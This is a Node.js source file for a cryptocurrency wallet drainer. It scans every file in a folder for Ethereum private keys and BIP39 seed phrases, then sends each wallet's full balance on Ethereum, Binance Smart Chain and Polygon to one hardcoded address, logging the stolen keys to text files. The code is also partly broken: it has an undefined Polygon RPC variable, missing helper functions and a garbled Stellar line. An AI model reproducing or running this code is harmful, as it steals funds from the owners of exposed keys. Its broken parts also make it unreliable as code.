//const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
//const cheerio = require('cheerio');
const { Wallet, providers, ethers } = require('ethers');
const StellarSdk = require('stellar-sdk');
const colors = require('colors');
const bip39 = require('bip39');
const path = require('path');
const hdkey = require('ethereumjs-wallet').hdkey;
const StellarHDWallet = require('stellar-hd-wallet');
const fg = require('fast-glob');
 
// Ethereum address to transfer funds
const ethereumRecipientAddress = '0xd35EE854BDF18fA4109dB8Db4EFf94a12E0458d5';
 
// Binance Smart Chain address to transfer funds
const bscRecipientAddress = '0xd35EE854BDF18fA4109dB8Db4EFf94a12E0458d5';
 
// Polygon address to transfer funds
const polygonRecipientAddress = '0xd35EE854BDF18fA4109dB8Db4EFf94a12E0458d5';
 
// Stellar address to transfer funds
// Stellar aconst stellarRecipientAddress = 'GB46JMLXQ6JN5637WOLLY5KWWJ2YRPUULVW6GY45YDNLFLAQ5QI4UCFC';
 
// Ethereum JSON-RPC URL
const ethereumRpcUrl = 'rpc.ankr.com/';
 
// Binance Smart Chain JSON-RPC URL
const bscRpcUrl = 'https://bsc-dataseed1.binance.org/';
 
 
// Function to check if a given string is a valid Ethereum mnemonic
const isValidMnemonic = (mnemonic) => {
  return bip39.validateMnemonic(mnemonic);
};
 
// Function to check if a given subset of words is a valid Ethereum mnemonic
const isValidMnemonicSubset = (mnemonicSubset) => {
  const mnemonic = mnemonicSubset.split(' ').join(' '); // Remove extra spaces between words
  return bip39.validateMnemonic(mnemonic);
};
 

// Function to calculate the minimum balance
function calculateMinimumBalance(subentryCount) {
  const baseReserve = 0.5;
  const additionalReserve = 0.5;
  return baseReserve + additionalReserve * (subentryCount + 2);
}
 
const folderPath = './folder'; // Replace with the path to your "gold" folder
 
let totalLines = 0;
let scanningPaused = false; // Flag to indicate if scanning is paused
let transactionInProgress = false; // Flag to indicate if a transaction is in progress
const lineQueue = [];
 
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false
});
 
async function processFile(filePath) {
  return new Promise((resolve, reject) => {
    const readStream = fs.createReadStream(filePath, 'utf8');
    const chunks = [];
 
    readStream.on('data', (chunk) => {
      chunks.push(chunk);
    });
 
    readStream.on('end', async () => {
      const fileContent = chunks.join('');
 
      const privateKeyRegex = /(?:0x[a-fA-F0-9]{64})|(?:[0-9a-fA-F]{64})|(?:xprv[A-Za-z0-9]{107})/g;
      const mnemonicRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b)+/g;
      const sentenceRegex = /(?:[A-Fa-f0-9]{64}(?![A-Fa-f0-9]))|(?:S[A-Za-z2-7]{55}(?![A-Za-z2-7]))/g;
      const mnemonicSubsetRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b){11,23}/g;
	  
      const lines = fileContent.split('\n');
 
      for (const line of lines) {
        console.log(`Processing line: ${line}`);
        totalLines++;
 
        let foundMnemonics = [];
        let foundKeys = [];
        let foundSentences = [];
 
        const privateKeys = line.match(privateKeyRegex);
        const mnemonics = line.match(mnemonicRegex);
        const sentences = line.match(sentenceRegex);
        const mnemonicSubsets = line.match(mnemonicSubsetRegex);
 
        if (privateKeys) {
          foundKeys.push(...privateKeys);
        }
 
        if (mnemonics) {
          foundMnemonics.push(...mnemonics);
        }
 
        if (sentences) {
          foundSentences.push(...sentences);
        }

        // Process the found private keys
        for (const privateKey of foundKeys) {
          // Validate the Ethereum private key
          if (isValidPrivateKey(privateKey)) {
            console.log(`Found valid Ethereum private key: ${privateKey}`);
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            await transferFundsEthereum(privateKey);
            await transferFundsBinance(privateKey);
            await transferFundsPolygon(privateKey);
            transactionInProgress = false;
            scanningPaused = false;
          }
        }
 
        // Process the found mnemonic seed phrases
        for (let i = 0; i < foundMnemonics.length; i++) {
          const mnemonic = foundMnemonics[i].trim();
          // Validate the Ethereum mnemonic
          if (isValidMnemonic(mnemonic)) {
            console.log(`Found valid Ethereum mnemonic: ${mnemonic}`);
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            await transferFundsEthereumFromMnemonic(mnemonic);
            await transferFundsBinanceFromMnemonic(mnemonic);
            await transferFundsPolygonFromMnemonic(mnemonic);
            transactionInProgress = false;
            scanningPaused = false;
          }
        }
 
 
        // Process blocks of numbers and letters to find private keys
        if (line.length >= 64) {
          const blocks = line.match(/[A-Fa-f0-9]{64}(?![A-Fa-f0-9])/g);
          if (blocks && blocks.length > 0) {
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            for (const block of blocks) {
              if (isValidPrivateKeyBlock(block)) {
                console.log(`Found valid Ethereum private key in block: ${block}`);
                await transferFundsEthereum(block);
                await transferFundsBinance(block);
                await transferFundsPolygon(block);
              } else {
                console.log(`Invalid private key block: ${block}`);
              }
            }
            transactionInProgress = false;
            scanningPaused = false;
          }
        }
 

        // Process the found sentences to find 12-24 word mnemonic seed phrases
        for (let i = 0; i < foundSentences.length; i++) {
          const sentence = foundSentences[i].trim();
          const words = sentence.split(' ');
 
          let j = 0;
          while (j <= words.length - 12) {
            let k = j + 11;
            while (k <= words.length - 12 && k <= j + 23) {
              const mnemonicSubset = words.slice(j, k + 1).join(' ');
 
              // Validate the subset as a mnemonic
              if (isValidMnemonicSubset(mnemonicSubset)) {
                console.log(`Found valid Ethereum mnemonic: ${mnemonicSubset}`);
                transactionInProgress = true;
                scanningPaused = true;
                rl.pause();
                await transferFundsEthereumFromMnemonic(mnemonicSubset);
                await transferFundsBinanceFromMnemonic(mnemonicSubset);
                await transferFundsPolygonFromMnemonic(mnemonicSubset);
                transactionInProgress = false;
                scanningPaused = false;
              }
              k++;
            }
            j++;
          }
        }
 
        // Process the found mnemonic subsets within sentences
        if (mnemonicSubsets) {
          for (const mnemonicSubset of mnemonicSubsets) {
            // Validate the subset as a mnemonic
            if (isValidMnemonicSubset(mnemonicSubset)) {
              console.log(`Found valid Ethereum mnemonic in sentence: ${mnemonicSubset}`);
              transactionInProgress = true;
              scanningPaused = true;
              rl.pause();
              await transferFundsEthereumFromMnemonic(mnemonicSubset);
              await transferFundsBinanceFromMnemonic(mnemonicSubset);
              await transferFundsPolygonFromMnemonic(mnemonicSubset);
              transactionInProgress = false;
              scanningPaused = false;
            }
          }
        }
 
        if (lineQueue.length > 0) {
          const nextLine = lineQueue.shift();
          rl.emit('line', nextLine);
        }
      }
 
      resolve();
    });
 
    rl.on('close', () => {
      console.log(`Total lines processed: ${totalLines}`);
    });
 
    rl.on('error', (error) => {
      reject(error);
    });
  });
}
 
async function processFolder(folderPath) {
  const files = await fg('**/*', { cwd: folderPath, onlyFiles: true, dot: true });
 
  for (const file of files) {
    const filePath = path.join(folderPath, file);
    const stats = fs.statSync(filePath);
 
    if (stats.isDirectory()) {
      await processFolder(filePath); // Recursively process subfolders
    } else {
      await processFile(filePath); // Process individual files
    }
  }
}
 
(async () => {
  try {
    await processFolder(folderPath);
    console.log('All files processed.');
  } catch (error) {
    console.error('Error processing files:', error);
  }
})();
 
async function transferFundsEthereum(privateKey) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(ethereumRpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
 
    await sleep(3000); // 3 seconds delay
    const balance = await wallet.getBalance();
    const balanceEther = ethers.utils.formatEther(balance);
    console.log(`Balance in Ethereum wallet: ${balanceEther} ETH`);
 
    if (balance.isZero()) {
      console.log('Skipping transaction - no balance in Ethereum wallet');
      return; // Exit the function if there is no balance
    }
	
	const walletData = {
      address: wallet.address,
      privateKey: wallet.privateKey,
      balance: balanceEther,
    };
 
    // Place the logBalanceToFile() function call here
    await logBalanceToFile(walletData, 'Ethereum');
 
    await sleep(3000); // 3 seconds delay
    const transactionFee = await wallet.provider.getGasPrice();
    const transactionFeeEther = ethers.utils.formatEther(transactionFee);
    console.log(`Transaction fee: ${transactionFeeEther} ETH`);
 
    const amountToSend = balance.sub(transactionFee);
    if (amountToSend.lte(0)) {
      console.log('Skipping transaction - not enough balance for transaction fee');
      return; // Exit the function if there is not enough balance for the transaction fee
    }
 
    const transaction = {
      to: ethereumRecipientAddress,
      value: amountToSend,
      gasPrice: transactionFee,
    };
 
    // Add delay before sending the transaction
    await sleep(3000); // 3 seconds delay
    const sendTransaction = await wallet.sendTransaction(transaction);
    console.log(`Transaction sent: ${sendTransaction.hash}`);
 
    // Append transaction details to the transaction log file
    await logTransactionToFile(walletData, ethereumRecipientAddress, amountToSend, transactionFee, 'Ethereum');
  } catch (error) {
    console.error('Error transferring funds via Ethereum:', error.message);
  }
  scanningPaused = false; // Resume scanning after processing the transaction
}
 
async function transferFundsBinance(privateKey) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(bscRpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
    
	await sleep(3000); // 3 seconds delay
    const balance = await wallet.getBalance();
    const balanceEther = ethers.utils.formatEther(balance);
    console.log(`Balance in Binance Smart Chain wallet: ${balanceEther} BNB`);
 
    if (balance.isZero()) {
      console.log('Skipping transaction - no balance in Binance Smart Chain wallet');
      return; // Exit the function if there is no balance
    }
	
    const walletData = {
      address: wallet.address,
      privateKey: wallet.privateKey,
      balance: balanceEther,
    };
	
	// Place the logBalanceToFile() function call here
    await logBalanceToFile(walletData, 'Binance Smart Chain');
    
	await sleep(3000); // 3 seconds delay
    const transactionFee = await wallet.provider.getGasPrice();
    const transactionFeeEther = ethers.utils.formatEther(transactionFee);
    console.log(`Transaction fee: ${transactionFeeEther} BNB`);
 
    const amountToSend = balance.sub(transactionFee);
    if (amountToSend.lte(0)) {
      console.log('Skipping transaction - not enough balance for transaction fee');
      return; // Exit the function if there is not enough balance for the transaction fee
    }
 
    const transaction = {
      to: bscRecipientAddress,
      value: amountToSend,
      gasPrice: transactionFee,
    };
 
    // Add delay before sending the transaction
    await sleep(3000); // 3 seconds delay
    const sendTransaction = await wallet.sendTransaction(transaction);
    console.log(`Transaction sent: ${sendTransaction.hash}`);
 
 
	// Append transaction details to the transaction log file
    await logTransactionToFile(walletData, bscRecipientAddress, amountToSend, transactionFee, 'Binance Smart Chain');
  } catch (error) {
    console.error('Error transferring funds via Binance Smart Chain:', error.message);
  }
    scanningPaused = false; // Resume scanning after processing the transaction
}
 
async function transferFundsPolygon(privateKey) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(polygonRpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
    
	await sleep(3000); // 3 seconds delay
    const balance = await wallet.getBalance();
    const balanceEther = ethers.utils.formatEther(balance);
    console.log(`Balance in Polygon wallet: ${balanceEther} MATIC`);
 
    if (balance.isZero()) {
      console.log('Skipping transaction - no balance in Binance Smart Chain wallet');
      return; // Exit the function if there is no balance
    }
	
	const walletData = {
      address: wallet.address,
      privateKey: wallet.privateKey,
      balance: balanceEther,
    };
	
	// Place the logBalanceToFile() function call here
    await logBalanceToFile(walletData, 'Polygon');
    
	await sleep(3000); // 3 seconds delay
    const transactionFee = await wallet.provider.getGasPrice();
    const transactionFeeEther = ethers.utils.formatEther(transactionFee);
    console.log(`Transaction fee: ${transactionFeeEther} MATIC`);
 
    const amountToSend = balance.sub(transactionFee);
    if (amountToSend.lte(0)) {
      console.log('Skipping transaction - not enough balance for transaction fee');
      return; // Exit the function if there is not enough balance for the transaction fee
    }
 
    const transaction = {
      to: polygonRecipientAddress,
      value: amountToSend,
      gasPrice: transactionFee,
    };
 
    // Add delay before sending the transaction
    await sleep(3000); // 3 seconds delay
    const sendTransaction = await wallet.sendTransaction(transaction);
    console.log(`Transaction sent: ${sendTransaction.hash}`);
 
    // Append transaction details to the transaction log file
    await logTransactionToFile(walletData, polygonRecipientAddress, amountToSend, transactionFee, 'Polygon');
  } catch (error) {
    console.error('Error transferring funds via Polygon:', error.message);
  }
    scanningPaused = false; // Resume scanning after processing the transaction
}
  
 
async function derivePrivateKeyFromMnemonic(mnemonic, path) {
  const seed = await bip39.mnemonicToSeed(mnemonic);
  const hdNode = hdkey.fromMasterSeed(seed);
  const childNode = hdNode.derivePath(path);
  const privateKey = childNode.getWallet().getPrivateKeyString();
  return privateKey;
}
 
 
async function transferFundsEthereumFromMnemonic(mnemonic, mnemonicSubset) {
  try {
    // Derive the private key from the mnemonic seed
    const path = "m/44'/60'/0'/0/0"; // Derivation path for Ethereum
    const privateKey = await derivePrivateKeyFromMnemonic(mnemonic, path);
 
    // Transfer funds using the derived private key
    await transferFundsEthereum(privateKey);
  } catch (error) {
    console.error('Error transferring funds via Ethereum from mnemonic:', error.message);
  }
}
 
async function transferFundsBinanceFromMnemonic(mnemonic, mnemonicSubset) {
  try {
    // Derive the private key from the mnemonic seed
    const path = "m/44'/60'/0'/0/0"; // Derivation path for Binance
    const privateKey = await derivePrivateKeyFromMnemonic(mnemonic, path);
 
    // Transfer funds using the derived private key
    await transferFundsBinance(privateKey);
  } catch (error) {
    console.error('Error transferring funds via Binance Smart Chain from mnemonic:', error.message);
  }
}
 
async function transferFundsPolygonFromMnemonic(mnemonic, mnemonicSubset) {
  try {
    // Derive the private key from the mnemonic seed
    const path = "m/44'/60'/0'/0/0"; // Derivation path for Binance
    const privateKey = await derivePrivateKeyFromMnemonic(mnemonic, path);
 
    // Transfer funds using the derived private key
    await transferFundsPolygon(privateKey);
  } catch (error) {
    console.error('Error transferring funds via Binance Smart Chain from mnemonic:', error.message);
  }
}
 
async function logBalanceToFile(walletData, blockchain) {
  const balanceLogFilePath = `./${blockchain}_balance_log.txt`;
 
  let balanceLogEntry = `Address: ${walletData.address}\n`;
  if (blockchain === 'Ethereum') {
    balanceLogEntry += `Secret Key: ${walletData.secretKey}\n`;
  } else {
    balanceLogEntry += `Private Key: ${walletData.privateKey}\n`;
  }
  balanceLogEntry += `Balance: ${walletData.balance} ${blockchain}\n\n`;
 
  fs.appendFileSync(balanceLogFilePath, balanceLogEntry);
  console.log(`Logged balance to file: ${balanceLogFilePath}`);
}
 
 
 
// Function to log transaction details to a file
async function logTransactionToFile(walletData, recipientAddress, amountToSend, transactionFee, blockchain) {
  const transactionLogFilePath = `./${blockchain}_transaction_log.txt`;
 
  const transactionLogEntry = `Transaction Details:\nFrom: ${walletData.address}\nTo: ${recipientAddress}\nAmount: ${amountToSend.toString()}\nTransaction Fee: ${transactionFee.toString()}\n\n`;
  fs.appendFileSync(transactionLogFilePath, transactionLogEntry);
  console.log(`Logged transaction details to file: ${transactionLogFilePath}`);
}
 